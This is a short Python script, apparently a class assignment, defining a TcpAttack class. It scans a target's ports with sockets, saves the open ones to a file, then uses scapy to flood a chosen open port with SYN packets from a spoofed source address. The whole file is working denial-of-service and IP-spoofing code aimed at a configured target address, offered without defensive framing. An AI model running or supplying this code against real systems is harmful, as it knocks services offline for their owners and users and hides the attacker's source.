import socket
from scapy.all import IP, TCP, send, RandShort

class TcpAttack():
    def __init__(self, spoofIP: str, targetIP: str)-> None:
        # spoofIP: String containing the IP address to spoof

        self.spoofIP = spoofIP
        self.targetIP = targetIP

    def scanTarget(self, rangeStart: int, rangeEnd: int)-> None:
        # rangeStart: Integer designating the first port in the range of ports being scanned
        # rangeEnd: Integer designating the last port in the range of ports being scanned
        # return value: no return value, however, writes open ports to openports.txt
        open_ports = []
        for port in range(rangeStart, rangeEnd + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((self.targetIP, port))

            if result == 0:
                open_ports.append(port)

            sock.close()
        with open("openports.txt", "w") as f:
            for port in sorted(open_ports):
                f.write(f"{port}\n")    


    def attackTarget(self, port: int, numSyn: int)-> int:
        # port: integer designating the port that the attack will use
        # numSyn: integer of syn packets to send to target IP address at the given port
        # if the port is open, perform a DOS attack and return 1. Otherwise return 0
        open_ports = []
        
        try:
            with open ("openports.txt", "r") as file:
                open_ports = [int(line.strip()) for line in file]

        except FileNotFoundError:
            return 0
        
        if port not in open_ports:
            return 0
        
        for _ in range(numSyn):
            syn_packet = IP(src=self.spoofIP, dst=self.targetIP) / TCP(sport=RandShort(), dport=port, flags="S")
            send(syn_packet, verbose=0)
        return 1


        

if __name__ =="__main__":
    
    spoofIP = "10.10.10.10"  
    targetIP = "192.168.68.62"  

    rangeStart = 8080
    rangeEnd = 8090

    port = 8080
    numSyn = 50

    tcp = TcpAttack(spoofIP, targetIP)
    tcp.scanTarget(rangeStart, rangeEnd)

    if tcp.attackTarget(port, numSyn):
        print(f"Port {port} was open , and flooded with {numSyn} SYN packets")
    else:
        print("Attack failed! Port might be closed.")